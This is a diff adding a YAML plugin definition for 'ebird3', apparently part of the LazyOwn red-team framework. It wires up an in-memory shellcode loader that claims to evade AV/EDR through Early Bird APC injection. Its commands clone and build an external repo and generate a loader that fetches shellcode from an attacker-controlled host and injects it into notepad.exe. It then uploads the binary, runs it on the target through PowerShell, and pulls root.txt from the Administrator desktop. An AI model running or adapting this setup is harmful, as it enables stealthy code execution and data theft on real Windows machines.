@@ -1,0 +1,24 @@
+name: ebird3
+description: >
+  ebird3 is a next-generation, automated framework for generating, obfuscating, and delivering shellcode through in-memory loaders. Designed for red team operations, penetration testing, and offensive research, ebird3 empowers attackers to deploy stealthy, fileless payloads that execute directly in memory — bypassing traditional AV/EDR detection mechanisms using Early Bird APC Injection and NT Native API Calls.
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+  - name: lport
+    type: string
+    required: true
+    description: lport to operate.
+tool:
+  name: ebird3
+  repo_url: https://github.com/grisuno/ebird3.git
+  install_path: external/.exploit/ebird3
+  install_command: make windows
+  execute_command: chmod +x *.sh && ./gen_ebird3.sh --target windows --url http://{lhost}/shellcode_windows.txt --key 0x33 --process-name "C:/Windows/System32/notepad.exe"
+  upload_file: no_priv ./external/.exploit/ebird3/ebird2.exe
+  remote_command: no_priv powershell .\ebird2.exe
+  download_file: C:\Users\Administrator\Desktop\root.txt
